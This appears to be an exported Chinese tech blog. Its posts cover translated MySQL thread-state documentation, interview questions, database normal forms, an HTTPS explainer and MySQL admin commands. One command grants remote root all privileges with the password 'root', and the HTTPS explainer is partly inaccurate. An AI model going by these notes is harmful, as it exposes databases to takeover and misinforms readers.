    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-thread%2F</url>
    <content type="text"><![CDATA[8.14.1线程命令值 8.14.2一般线程状态 8.14.3查询缓存线程状态 8.14.4复制主线程状态 8.14.5复制从站I / O线程状态 8.14.6复制从属SQL线程状态 8.14.7复制从站连接线程状态 8.14.8 NDB集群线程状态 8.14.9事件调度程序线程状态 当您试图确定MySQL服务器正在做什么时，检查进程列表会很有帮助，进程列表是当前在服务器中执行的线程集。可从以下来源获取流程列表信息： 该SHOW [FULL] PROCESSLIST语句： 第13.7.5.29，“SHOW PROCESSLIST语法” 该SHOW PROFILE语句： 第13.7.5.31，“显示配置文件语法” 该INFORMATION_SCHEMA PROCESSLIST表： 第24.17，“该INFORMATION_SCHEMA PROCESSLIST表” 在中mysqladmin processlist的命令： 第4.5.2节“ 中mysqladmin -客户端管理MySQL服务器” 性能模式threads 表，阶段表和锁定表： 第25.11.16节“性能模式杂项表”， 第25.11.5节“性能模式阶段事件表”， 第25.11.12节“性能模式锁定表”。 该sys架构 processlist视图，呈现从性能架构信息 threads表中更方便的格式：第26.4.3.22，“ProcessList中和X $ PROCESSLIST意见” 该sys架构 session视图，其中介绍有关用户会话的信息（如 sys架构 processlist视图，但是过滤掉后台进程）： 第26.4.3.33，“会议和X $会话视图” 访问threads不需要互斥锁，对服务器性能的影响最小。 INFORMATION_SCHEMA.PROCESSLIST并且SHOW PROCESSLIST因为它们需要互斥锁而 产生负面的性能影响。 threads还显示有关后台线程的信息，有哪些 INFORMATION_SCHEMA.PROCESSLIST， SHOW PROCESSLIST有时没有。这意味着threads可以用来监视其他线程信息源不能的活动。 您始终可以查看有关自己的线程的信息。要查看有关正在为其他帐户执行的线程的信息，您必须具有该PROCESS权限。 每个进程列表条目包含几条信息： Id 是与线程关联的客户端的连接标识符。 User并Host指明与该线程关联的帐户。 db是线程的默认数据库，或者NULL如果没有选择。 Command并State 指出线程正在做什么。 大多数州对应于非常快速的操作。如果一个线程停留在给定状态很多秒，则可能存在需要调查的问题。 Time表示线程处于当前状态的时间。在某些情况下，线程的当前时间概念可能会改变：线程可以改变时间。对于正在处理来自主站的事件的从站上运行的线程，线程时间设置为在事件中找到的时间，因此反映了主站而不是从站的当前时间。 SET TIMESTAMP = value Info包含线程正在执行的语句的文本，或者NULL它是否正在执行。默认情况下，此值仅包含语句的前100个字符。要查看完整的语句，请使用 SHOW FULL PROCESSLIST。 以下部分列出了可能的 Command值以及State 按类别分组的值。其中一些价值观的含义是不言而喻的。对于其他人，提供了另外的描述。 8.14.1线程命令值线程可以具有以下任何 Command值： Binlog Dump 这是主服务器上的一个线程，用于将二进制日志内容发送到从属服务器。 Change user 线程正在执行更改用户操作。 Close stmt 线程正在关闭准备好的声明。 Connect 复制从站连接到其主站。 Connect Out 复制从站正在连接到其主站。 Create DB 线程正在执行create-database操作。 Daemon 此线程是服务器的内部线程，而不是为客户端连接提供服务的线程。 Debug 该线程正在生成调试信息。 Delayed insert 该线程是一个延迟插入处理程序。 Drop DB 该线程正在执行drop-database操作。 Error Execute 线程正在执行预准备语句。 Fetch 该线程正在从执行预准备语句中获取结果。 Field List 该线程正在检索表列的信息。 Init DB 该线程正在选择默认数据库。 Kill 该线程正在杀死另一个线程。 Long Data 线程正在检索执行预准备语句的结果中的长数据。 Ping 该线程正在处理服务器ping请求。 Prepare 线程正在准备一份准备好的声明。 Processlist 该线程正在生成有关服务器线程的信息。 Query 线程正在执行一个语句。 Quit 线程正在终止。 Refresh 该线程正在刷新表，日志或缓存，或重置状态变量或复制服务器信息。 Register Slave 线程正在注册从服务器。 Reset stmt 该线程正在重置准备好的语句。 Set option 该线程正在设置或重置客户端语句执行选项。 Shutdown 该线程正在关闭服务器。 Sleep 线程正在等待客户端向其发送新语句。 Statistics 该线程正在生成服务器状态信息。 Table Dump 线程正在将表内容发送到从属服务器。 Time 没用过。 8.14.2一般线程状态以下列表描述了State 与常规查询处理相关联的线程值，而不是更复杂的特殊活动。其中许多仅用于查找服务器中的错误。 After create 当线程在创建表的函数末尾创建表（包括内部临时表）时，会发生这种情况。即使由于某些错误而无法创建表，也会使用此状态。 Analyzing 线程正在计算MyISAM表键分布（例如，for ANALYZE TABLE）。 checking permissions 线程正在检查服务器是否具有执行该语句所需的权限。 Checking table 该线程正在执行表检查操作。 cleaning up 该线程已经处理了一个命令，并准备释放内存并重置某些状态变量。 closing tables 该线程正在将更改的表数据刷新到磁盘并关闭已使用的表。这应该是一个快速的操作。如果没有，请验证您没有完整磁盘并且磁盘使用不是很大。 converting HEAP to ondisk 该线程正在将内部临时表从 MEMORY表转换为磁盘表。 copy to tmp table 线程正在处理一个ALTER TABLE语句。这种状态发生在创建新结构的表之后，但在将行复制到其中之前。 对于处于此状态的线程，可以使用性能模式来获取有关复制操作的进度。请参见 第25.11.5节“性能模式阶段事件表”。 Copying to group table 如果语句具有不同ORDER BY和 GROUP BY标准，各行按组排列和复制到一个临时表。 Copying to tmp table 服务器正在复制到内存中的临时表。 altering table 服务器正在执行就地 ALTER TABLE。 Copying to tmp table on disk 服务器正在复制到磁盘上的临时表。临时结果集变得太大（请参见 第8.4.4节“MySQL中的内部临时表使用”）。因此，线程正在将临时表从内存更改为基于磁盘的格式以节省内存。 Creating index 线程正在处理ALTER TABLE … ENABLE KEYS一个MyISAM表。 Creating sort index 线程正在处理SELECT使用内部临时表解析的线程 。 creating table 线程正在创建一个表。这包括创建临时表。 Creating tmp table 该线程正在内存或磁盘上创建临时表。如果表在内存中创建但稍后转换为磁盘表，则该操作期间的状态将为Copying to tmp table on disk。 committing alter table to storage engine 服务器已就地完成 ALTER TABLE并正在提交结果。 deleting from main table 服务器正在执行多表删除的第一部分。它仅从第一个表中删除，并保存用于从其他（引用）表中删除的列和偏移量。 deleting from reference tables 服务器正在执行多表删除的第二部分，并从其他表中删除匹配的行。 discard_or_import_tablespace 线程正在处理ALTER TABLE … DISCARD TABLESPACE或ALTER TABLE … IMPORT TABLESPACE声明。 end 这发生在结束，但的清理之前 ALTER TABLE， CREATE VIEW， DELETE， INSERT， SELECT，或 UPDATE语句。 executing 线程已开始执行语句。 Execution of init_command 线程正在执行init_command系统变量值中的语句 。 freeing items 线程执行了一个命令。在此状态期间完成的一些项目的释放涉及查询缓存。这种状态通常紧随其后cleaning up。 FULLTEXT initialization 服务器正准备执行自然语言全文搜索。 init 出现这种情况的初始化之前 ALTER TABLE， DELETE， INSERT， SELECT，或 UPDATE语句。服务器在此状态下采取的操作包括刷新二进制日志，InnoDB日志和一些查询缓存清理操作。 对于end州，可能会发生以下操作： 删除表中的数据后删除查询缓存条目 将事件写入二进制日志 释放内存缓冲区，包括blob Killed 有人KILL 向线程发送了一个语句，它应该在下次检查kill标志时中止。在MySQL中的每个主循环中检查该标志，但在某些情况下，线程可能仍然需要很短的时间才能死掉。如果线程被某个其他线程锁定，则一旦另一个线程释放其锁定，kill就会生效。 logging slow query 该线程正在向慢查询日志写一条语句。 login 连接线程的初始状态，直到客户端成功通过身份验证。 manage keys 服务器正在启用或禁用表索引。 NULL 该状态用于该SHOW PROCESSLIST状态。 Opening tables 该线程正在尝试打开一个表。这应该是非常快的程序，除非有什么东西阻止打开。例如，一个ALTER TABLE或一个 LOCK TABLE语句可以阻止在语句结束之前打开表。还值得检查您的table_open_cache价值是否足够大。 optimizing 服务器正在对查询执行初始优化。 preparing 在查询优化期间发生此状态。 Purging old relay logs 该线程正在删除不需要的中继日志文件。 query end 处理查询后但在freeing items状态之前发生此 状态。 Receiving from client 服务器正在从客户端读取数据包。Reading from net在MySQL 5.7.8之前调用此状态。 Removing duplicates 该查询使用 SELECT DISTINCT的方式是MySQL无法在早期阶段优化掉不同的操作。因此，在将结果发送到客户端之前，MySQL需要额外的阶段来删除所有重复的行。 removing tmp table 该线程在处理SELECT 语句后删除内部临时表。如果未创建临时表，则不使用此状态。 rename 该线程正在重命名一个表。 rename result table 线程正在处理一个ALTER TABLE语句，创建了新表，并重命名它以替换原始表。 Reopen tables 线程获得了表的锁定，但在获取锁定后注意到基础表结构发生了变化。它释放了锁，关闭了桌子，并试图重新打开它。 Repair by sorting 修复代码使用排序来创建索引。 preparing for alter table 服务器正准备执行就地 ALTER TABLE。 Repair done 该线程已完成对MyISAM表的多线程修复 。 Repair with keycache 修复代码通过密钥缓存逐个创建密钥。这比慢得多Repair by sorting。 Rolling back 该线程正在回滚一个事务。 Saving state 对于MyISAM诸如修复或分析的表操作，线程将新表状态保存到.MYI文件头。State包括诸如行数， AUTO_INCREMENT计数器和密钥分发之类的信息。 Searching rows for update 该线程正在进行第一阶段以在更新之前查找所有匹配的行。如果 UPDATE要更改用于查找所涉及行的索引，则必须执行此操作。 Sending data 线程正在读取和处理SELECT语句的行 ，并将数据发送到客户端。由于在此状态期间发生的操作往往会执行大量磁盘访问（读取），因此它通常是给定查询生命周期中运行时间最长的状态。 Sending to client 服务器正在将数据包写入客户端。Writing to net在MySQL 5.7.8之前调用此状态。 setup 线程正在开始一个ALTER TABLE操作。 Sorting for group 线程正在进行排序以满足a GROUP BY。 Sorting for order 线程正在进行排序以满足ORDER BY。 Sorting index 线程正在对索引页进行排序，以便在MyISAM表优化操作期间进行更有效的访问。 Sorting result 对于SELECT声明，这类似于Creating sort index非临时表。 statistics 服务器正在计算统计信息以开发查询执行计划。如果线程长时间处于此状态，则服务器可能是磁盘绑定执行其他工作。 System lock 线程已调用mysql_lock_tables() ，并且线程状态尚未更新。这是一个非常普遍的状态，可能由于许多原因而发生。 例如，线程将要求或正在等待表的内部或外部系统锁定。InnoDB在执行期间等待表级锁定时会 发生这种情况LOCK TABLES。如果此状态是由外部锁的请求引起的，并且您没有使用多个访问相同 表的mysqld服务器，则MyISAM可以使用该–skip-external-locking 选项禁用外部系统锁 。但是，默认情况下禁用外部锁定，因此该选项很可能无效。对于 SHOW PROFILE，这个状态意味着线程正在请求锁定（不等待它）。 update 线程正准备开始更新表。 Updating 线程正在搜索要更新的行并正在更新它们。 updating main table 服务器正在执行多表更新的第一部分。它仅更新第一个表，并保存用于更新其他（引用）表的列和偏移量。 updating reference tables 服务器正在执行多表更新的第二部分，并更新其他表中的匹配行。 User lock 该线程将要求或正在等待通过GET_LOCK()呼叫请求的咨询锁 。对于 SHOW PROFILE，此状态表示线程正在请求锁定（不等待它）。 User sleep 该线程已经调用了一个 SLEEP()调用。 Waiting for commit lock FLUSH TABLES WITH READ LOCK 正在等待提交锁定。 Waiting for global read lock FLUSH TABLES WITH READ LOCK 正在等待全局读锁定或read_only正在设置全局 系统变量。 Waiting for tables 该线程得到一个通知，表明表的底层结构已经改变，它需要重新打开表以获得新结构。但是，要重新打开表，它必须等到所有其他线程关闭了相关表。 该通知发生如果另一个线程已使用 FLUSH TABLES或有问题的表下面的语句之一： ， ， ， ， ，或 。 FLUSH TABLES tbl_nameALTER TABLERENAME TABLEREPAIR TABLEANALYZE TABLEOPTIMIZE TABLE Waiting for table flush 线程正在执行FLUSH TABLES并正在等待所有线程关闭它们的表，或者线程得到一个表的基础结构已经更改的通知，并且需要重新打开表以获取新结构。但是，要重新打开表，它必须等到所有其他线程关闭了相关表。 该通知发生如果另一个线程已使用 FLUSH TABLES或有问题的表下面的语句之一： ， ， ， ， ，或 。 FLUSH TABLES tbl_nameALTER TABLERENAME TABLEREPAIR TABLEANALYZE TABLEOPTIMIZE TABLE Waiting for lock_type lock 服务器正在等待THR_LOCK从元数据锁定子系统获取 锁定或锁定，其中 lock_type指示锁定的类型。 此状态表示等待 THR_LOCK： Waiting for table level lock 这些状态表示等待元数据锁定： Waiting for event metadata lock Waiting for global read lock Waiting for schema metadata lock Waiting for stored function metadata lock Waiting for stored procedure metadata lock Waiting for table metadata lock Waiting for trigger metadata lock 有关表锁指示器的信息，请参见 第8.11.1节“内部锁定方法”。有关元数据锁定的信息，请参见第8.11.4节“元数据锁定”。要查看哪些锁阻止了锁请求，请使用 第25.11.12节“性能模式锁表”中所述的性能模式锁表。 Waiting on cond 线程正在等待条件变为真的通用状态。没有具体的州信息。 Writing to net 服务器正在将数据包写入网络。Sending to client从MySQL 5.7.8开始调用此状态。 8.14.3查询缓存线程状态这些线程状态与查询缓存相关联（请参见 第8.10.3节“MySQL查询缓存”）。 checking privileges on cached query 服务器正在检查用户是否具有访问缓存查询结果的权限。 checking query cache for query 服务器正在检查查询缓存中是否存在当前查询。 invalidating query cache entries 查询缓存条目被标记为无效，因为基础表已更改。 sending cached result to client 服务器从查询缓存中获取查询结果并将其发送到客户端。 storing result in query cache 服务器将查询结果存储在查询缓存中。 Waiting for query cache lock 在会话等待获取查询缓存锁定时发生此状态。对于需要执行某些查询缓存操作的任何语句，例如 使查询缓存无效INSERT或 查找缓存条目 DELETE的语句，等等，都会发生这种情况。 SELECTRESET QUERY CACHE 8.14.4复制主线程状态以下列表显示了您可能在State主Binlog Dump线程的列中 看到的最常见状态。如果Binlog Dump在主服务器上看不到任何 线程，则表示复制未运行; 也就是说，当前没有连接任何奴隶。 Finished reading one binlog; switching to next binlog 线程已经读完二进制日志文件并打开下一个发送给从属的文件。 Master has sent all binlog to slave; waiting for more updates 该线程已从二进制日志中读取所有剩余更新并将其发送给从属。该线程现在处于空闲状态，等待主事件上发生的新更新导致二进制日志中出现新事件。 Sending binlog event to slave 二进制日志由事件组成，其中事件通常是更新以及一些其他信息。线程已从二进制日志中读取事件，现在将其发送给从站。 Waiting to finalize termination 线程停止时发生的非常短暂的状态。 8.14.5复制从站I / O线程状态以下列表显示了在State从属服务器I / O线程的列中看到的最常见状态 。此状态也出现在Slave_IO_State 显示的列中SHOW SLAVE STATUS，因此您可以通过使用该语句很好地了解正在发生的情况。 Checking master version 在建立与主站的连接之后非常短暂地发生的状态。 Connecting to master 线程正在尝试连接到主服务器。 Queueing master event to the relay log 线程已读取事件并将其复制到中继日志，以便SQL线程可以处理它。 Reconnecting after a failed binlog dump request 线程正在尝试重新连接到主服务器。 Reconnecting after a failed master event read 线程正在尝试重新连接到主服务器。当再次建立连接时，状态变为 Waiting for master to send event。 Registering slave on master 建立与主站连接后非常短暂发生的状态。 Requesting binlog dump 在建立与主站的连接之后非常短暂地发生的状态。线程从请求的二进制日志文件名和位置开始向主机发送对其二进制日志内容的请求。 Waiting for its turn to commit slave_preserve_commit_order 启用 了从属线程等待较旧的工作线程提交时发生的状态 。 Waiting for master to send event 线程已连接到主服务器并正在等待二进制日志事件到达。如果主站空闲，这可能会持续很长时间。如果等待持续 slave_net_timeout几秒钟，则发生超时。此时，线程认为连接被破坏并尝试重新连接。 Waiting for master update 之前的初始状态Connecting to master。 Waiting for slave mutex on exit 线程停止时短暂发生的状态。 Waiting for the slave SQL thread to free enough relay log space 您使用的是非零 relay_log_space_limit 值，并且中继日志已经增长到足以使其组合大小超过此值。I / O线程正在等待，直到SQL线程通过处理中继日志内容释放足够的空间，以便它可以删除一些中继日志文件。 Waiting to reconnect after a failed binlog dump request 如果二进制日志转储请求失败（由于断开连接），则线程在休眠时进入此状态，然后尝试定期重新连接。可以使用CHANGE MASTER TO语句指定重试之间的间隔 。 Waiting to reconnect after a failed master event read 读取时发生错误（由于断开连接）。CHANGE MASTER TO在尝试重新连接之前，线程正在休眠该语句设置的秒数 （默认为60）。 8.14.6复制从属SQL线程状态以下列表显示了您可能在State从属服务器SQL线程列中看到的最常见状态： Killing slave 线程正在处理一个STOP SLAVE 语句。 Making temporary file (append) before replaying LOAD DATA INFILE 线程正在执行一个 LOAD DATA INFILE语句，并将数据附加到一个临时文件中，该文件包含从属将从中读取行的数据。 Making temporary file (create) before replaying LOAD DATA INFILE 线程正在执行一个 LOAD DATA INFILE语句，并且正在创建一个临时文件，其中包含从属将从中读取行的数据。只有在LOAD DATA INFILE运行早于5.0.3版本的MySQL版本的主机记录原始语句时，才会遇到此状态 。 Reading event from the relay log 线程已从中继日志中读取事件，以便可以处理事件。 Slave has read all relay log; waiting for more updates 该线程已处理中继日志文件中的所有事件，现在正在等待I / O线程将新事件写入中继日志。 Waiting for an event from Coordinator 使用多线程从属（slave_parallel_workers大于1），其中一个从属工作线程正在等待来自协调器线程的事件。 Waiting for slave mutex on exit 线程停止时发生的非常短暂的状态。 Waiting for Slave Workers to free pending events 当Workers正在处理的事件的总大小超过slave_pending_jobs_size_max 系统变量的大小时，会发生此等待操作 。当大小低于此限制时，协调器将恢复计划。仅当slave_parallel_workers设置大于0 时才会出现此状态 。 Waiting for the next event in relay log 之前的初始状态Reading event from the relay log。 Waiting until MASTER_DELAY seconds after master executed event SQL线程已读取一个事件，但正在等待从属延迟失效。此延迟通过 MASTER_DELAY选项设置 CHANGE MASTER TO。 InfoSQL线程 的列也可以显示语句的文本。这表明线程已从中继日志中读取事件，从中提取语句，并可能正在执行它。 8.14.7复制从站连接线程状态这些线程状态出现在复制从属服务器上，但与连接线程相关联，而不是与I / O或SQL线程相关联。 Changing master 线程正在处理一个CHANGE MASTER TO语句。 Killing slave 线程正在处理一个STOP SLAVE 语句。 Opening master dump table 此状态发生在Creating table from master dump。 Reading master dump table data 此状态发生在Opening master dump table。 Rebuilding the index on master dump table 此状态发生在Reading master dump table data。 8.14.8 NDB集群线程状态Committing events to binlog Opening mysql.ndb_apply_status Processing events 该线程正在处理二进制日志记录的事件。 Processing events from schema table 该线程正在进行模式复制的工作。 Shutting down Syncing ndb table schema operation and binlog 这用于为NDB提供正确的模式操作二进制日志。 Waiting for allowed to take ndbcluster global schema lock 线程正在等待获取全局模式锁的权限。 Waiting for event from ndbcluster 服务器充当NDB群集中的SQL节点，并连接到群集管理节点。 Waiting for first event from ndbcluster Waiting for ndbcluster binlog update to reach current position Waiting for ndbcluster global schema lock 线程正在等待另一个线程持有的全局模式锁定被释放。 Waiting for ndbcluster to start Waiting for schema epoch 线程正在等待架构时期（即全局检查点）。 8.14.9事件调度程序线程状态这些状态发生在Event Scheduler线程，为执行调度事件而创建的线程或终止调度程序的线程中。 Clearing 调度程序线程或正在执行事件的线程正在终止并即将结束。 Initialized 调度程序线程或将执行事件的线程已初始化。 Waiting for next activation 调度程序具有非空事件队列，但下一次激活是将来的。 Waiting for scheduler to stop 线程已发出SET GLOBAL event_scheduler=OFF并正在等待调度程序停止。 Waiting on empty queue 调度程序的事件队列为空并且正在休眠。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于协议]]></title>
    <url>%2F2018%2F03%2F24%2Fagreement%2Fabout-agreement%2F</url>
    <content type="text"><![CDATA[what 协议？人民币算不算是一种协议？买家和卖家协议一张纸为 10元 、50元、100元 so ： 协议在互联网届就是发送方和接收方商量好的一种消息模式， Http：规定两个ip、一个发送ip、一个接收ip、这两个ip进行数据交互时候、先握手、确定数据畅通、然后在进行数据通信、握手协议：规定握手消息格式【一系列参数的排序】、数据通信规定http发送消息体消息格式。]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[架构师之路]]></title>
    <url>%2F2018%2F03%2F24%2Fessay%2Fessay-10%2F</url>
    <content type="text"><![CDATA[本着对技术的兴趣 进入了软件开发行业 可以说是如鱼得水的发展 凭借着年轻 挑灯夜战 掌握了许多技术应用、但仍脱不开技术应用者的领域 如今职业发展遇到瓶颈-该思考何去何从 想来想去只有选择架构师为发展方向 怎样成为一个架构师？ 首先什么是架构师？ 随着互联网应用的快速发展、各个领域相继进入互联网、各种业务形式的应用、一个合理的架构应对服务流量冲击显得尤为重要 那么应用架构针对应用更好的优化、分解、先有soa、后有微服务概念、对于这个整体的请求走势要做到心中有数、到细节中每个请求的所经过的服务器心里有谱、对服务器承载能力有着清晰的认识 脑海里要有一个三维网络图 同时能细节看到某个节点内部的工作方式、又能从宏观角度看的到请求流转、敏锐感知节点中的压力点 然后针对业务领域、每个请求的频率、有一个经验教训、才能更好的使用脑海中的技术架构去整合起来业务压力 外包待出的毛病，除了用，啥都不会]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里面霸总结的面试题]]></title>
    <url>%2F2018%2F03%2F24%2Fessay%2Fessay-13%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021（1）自我介绍，做过什么项目。（2）java虚拟机的区域如何划分，每一个区的动能，这一块自由发挥。（3）双亲委派模型中，从顶层到底层，都是哪些类加载器，分别加载哪些类？（4）有没有可能父类加载器和子类加载器，加载同一个类？如果加载同一个类，该使用哪一个类？（5）HashMap的结构，get()，put()是如何实现的？HashMap有哪些问题？（6）ConcurrentHashMap的get()，put()，又是如何实现的？ConcurrentHashMap有哪些问题？ ConcurrentHashMap的锁是读锁还是写锁？（7） HashMap与HashTable的区别（8）sleep()和wait()分别是哪个类的方法，有什么区别？synchronized底层如何实现的？用在代码块和方法上有什么区别？（9）什么是线程池？如果让你设计一个动态大小的线程池，如何设计，应该有哪些方法？（10）什么是死锁？JVM线程死锁，你该如何判断是因为什么？如果用VisualVM，dump线程信息出来，会有哪些信息？这一块问的很多....问的我懵了. 因为并没有实际操作过 = =（11）查看jvm虚拟机里面堆、线程的信息，你用过什么命令？我只用过图形界面VisualVM。。。（12）垃圾回收算法有哪些？CMS知道吗？如何工作的？（13）数据库中什么是事务？事务的隔离级别？事务的四个特性？什么是脏读，幻读，不可重复读？（14）数据库索引的结构有哪些？我说B树和B+树，他说只有这两个吗。我又说全文倒排索引。然后介绍B+树的结构。（15）数据库中的分页查询语句怎么写？（16）什么是一致性哈希？用来解决什么问题？（17）Redis的存储结构，或者说如何工作的，与mysql的区别？有哪些数据类型？（18）项目中用到redis，为什么选用redis，了解其他NoSQL数据库吗？在你的项目中是如何运用redis的？key是什么，value是什么？（19）归并排序的过程？时间复杂度？空间复杂度？（20）你平常用什么排序？快速排序。说说在那些场景下适用，哪些场景下不适用。（21）你在项目中做什么？因为我用到Solr，他就问我Solr是如何工作的？ 12345678910111213141516171819202122232425262728293031323334353637383940（1）自我介绍。（2）JVM如何加载一个类的过程，双亲委派模型中有哪些方法？（3）HashMap如何实现的？（4）HashMap和Concurrent HashMap区别， Concurrent HashMap 线程安全吗， Concurrent HashMap如何保证 线程安全？（5）HashMap和HashTable 区别，HashTable线程安全吗？（6）进程间通信有哪几种方式？（7）JVM分为哪些区，每一个区干吗的？（8）JVM如何GC，新生代，老年代，持久代，都存储哪些东西？（9）GC用的引用可达性分析算法中，哪些对象可作为GC Roots对象？（10）快速排序，过程，复杂度？（11）什么是二叉平衡树，如何插入节点，删除节点，说出关键步骤。（12）TCP如何保证可靠传输？三次握手过程？（13）TCP和UDP区别？（14）滑动窗口算法？（15）Linux下如何进行进程调度的？（16）Linux下你常用的命令有哪些？（17）操作系统什么情况下会死锁？（18）常用的hash算法有哪些？（19）什么是一致性哈希？（20）如何理解分布式锁？（21）数据库中的范式有哪些？（22）数据库中的索引的结构？什么情况下适合建索引？（23）Java中的NIO，BIO，AIO分别是什么？（24）用什么工具调试程序？JConsole，用过吗？（25）现在JVM中有一个线程挂起了，如何用工具查出原因？（26）线程同步与阻塞的关系？同步一定阻塞吗？阻塞一定同步吗？（27）同步和异步有什么区别？（28）线程池用过吗？（29）如何创建单例模式？说了双重检查，他说不是线程安全的。如何高效的创建一个线程安全的单例？（30）concurrent包下面，都用过什么？（31）常用的数据库有哪些？redis用过吗？（32）了解hadoop吗？说说hadoop的组件有哪些？hdfs，hive,hbase,zookeeper。说下mapreduce编程模型。（33）你知道的开源协议有哪些？（34）你知道的开源软件有哪些？（35）你最近在看的书有哪些？（36）你有什么问题要问我吗？（37）了解哪些设计模式？说说都用过哪些设计模式（38）如何判断一个单链表是否有环？（39）操作系统如何进行分页调度？（40）匿名内部类是什么？如何访问在其外面定义的变量？ 123456HashMap和Hashtable的区别实现一个保证迭代顺序的HashMap说一说排序算法，稳定性，复杂度说一说GC可以保证的实习时长职业规划]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Https协议]]></title>
    <url>%2F2018%2F03%2F24%2Fagreement%2Fhttps%2F</url>
    <content type="text"><![CDATA[http+ssl 使用http进行通信 ssl作为数据通信加密方式 使用非对称方式协商加密密钥、然后使用协商后的密钥进行密钥通信 混合加密方式 非对称加密方式协商加密方式、最后使用加密方式通讯 1、客户端 发送公钥、支持加密方式、版本号 2、服务器接收 公钥加密校验、选择加密方式 放松给客户端 3、客户端接收 服务器选定加密方式进行数据加密 4、使用协商后的加密方式加密http请求]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql-care点]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Fmysql-care-point%2F</url>
    <content type="text"><![CDATA[12查询缓存从 Mysql5.7.20开始已经弃用、并在MySQL8.0中删除]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库设计三大范式]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Fmysql-design-1%2F</url>
    <content type="text"><![CDATA[1．第一范式(确保每列保持原子性) 2．第二范式(确保表中的每列都和主键相关) 3．第三范式(确保每列都和主键列直接相关,而不是间接相关) 一、第一范式是最基本的范式。如果数据库表中的所有字段值都是不可分解的原子值，就说明该数据库表满足了第一范式。 第一范式的合理遵循需要根据系统的实际需求来定。比如某些数据库系统中需要用到“地址”这个属性，本来直接将“地址”属性设计成一个数据库表的字段就行。但是如果系统经常会访问“地址”属性中的“城市”部分，那么就非要将“地址”这个属性重新拆分为省份、城市、详细地址等多个部分进行存储，这样在对地址中某一部分操作的时候将非常方便。这样设计才算满足了数据库的第一范式，如下表所示。 上表所示的用户信息遵循了第一范式的要求，这样在对用户使用城市进行分类的时候就非常方便，也提高了数据库的性能。 二、第二范式在第一范式的基础之上更进一层。第二范式需要确保数据库表中的每一列都和主键相关，而不能只与主键的某一部分相关（主要针对联合主键而言）。也就是说在一个数据库表中，一个表中只能保存一种数据，不可以把多种数据保存在同一张数据库表中。 比如要设计一个订单信息表，因为订单中可能会有多种商品，所以要将订单编号和商品编号作为数据库表的联合主键，如下表所示。 订单信息表 这样就产生一个问题：这个表中是以订单编号和商品编号作为联合主键。这样在该表中商品名称、单位、商品价格等信息不与该表的主键相关，而仅仅是与商品编号相关。所以在这里违反了第二范式的设计原则。 而如果把这个订单信息表进行拆分，把商品信息分离到另一个表中，把订单项目表也分离到另一个表中，就非常完美了。如下所示。 这样设计，在很大程度上减小了数据库的冗余。如果要获取订单的商品信息，使用商品编号到商品信息表中查询即可。 三、第三范式需要确保数据表中的每一列数据都和主键直接相关，而不能间接相关。 比如在设计一个订单数据表的时候，可以将客户编号作为一个外键和订单表建立相应的关系。而不可以在订单表中添加关于客户其它信息（比如姓名、所属公司等）的字段。如下面这两个表所示的设计就是一个满足第三范式的数据库表。 这样在查询订单信息的时候，就可以使用客户编号来引用客户信息表中的记录，也不必在订单信息表中多次输入客户信息的内容，减小了数据冗余。 转载地址]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql最大连接数]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Fmysql-max-connects%2F</url>
    <content type="text"><![CDATA[linux默认1000 window 默认2000 还要根据文件系统 性能 来调节 mysql连接数]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL常用命令]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Fmysql-shell%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122mysql -u root -puse user;drop database user;use mysqlselect Host,User,authentication_string from mysql.user;grant all privileges on *.* to &apos;root&apos;@&apos;115.171.60.75&apos;identified by &apos;root&apos; with grant option;all insert update ...*.* : 数据库.表名root : 用户名115.170.*.* : 远程访问ip地址刷新配置flush privileges;delete from mysql.user where user=root and host = 115.171.60.75; 安装 原装地址：http://www.cnblogs.com/5201351/p/4912614.html12345678910111213141516171819202122232425262728293031卸载mriadb包[root@5201351 ~]# rpm -qa|grep mariadbmariadb-libs-5.5.41-2.el7_0.x86_64[root@5201351 ~]# rpm -e mariadb-libs-5.5.41-2.el7_0.x86_64 --nodeps安装mysql 安装包 https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-5.7.20-1.el7.x86_64.rpm-bundle.tarrpm -ivh *.rpm安装顺序 common libs client server两种初始化启动方式[root@5201351 ~]# mysql_install_db --datadir=/var/lib/mysql //必须指定datadir,执行后会生成~/.mysql_secret密码文件[root@5201351 ~]# mysqld --initialize //新版的推荐此方法，执行生会在/var/log/mysqld.log生成随机密码启动mysql[root@5201351 ~]# chown mysql:mysql /var/lib/mysql -R[root@5201351 ~]# systemctl start mysqld.service 查看密码cat ~/.mysql_secretcat /var/log/mysqld.log登录[root@5201351 ~]# mysql -uroot -p&apos;)j#)=uRig4yJ&apos;mysql&gt; set password=password(&apos;www.cnblogs.com/5201351&apos;);创建用户以及分配权限mysql&gt; create user &apos;root&apos;@&apos;192.168.100.2&apos; identified by &apos;QQ5201351&apos;;mysql&gt; GRANT ALL PRIVILEGES ON dbname.* to &apos;root&apos;@&apos;192.168.100.2&apos;;mysql&gt; flush privileges]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里电面总结]]></title>
    <url>%2F2018%2F03%2F24%2Fessay%2Fessay-12%2F</url>
